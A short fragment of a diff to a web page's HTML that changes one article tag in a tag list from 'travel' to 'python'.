               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">travel</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
             
             <div class="clearfix"></div>
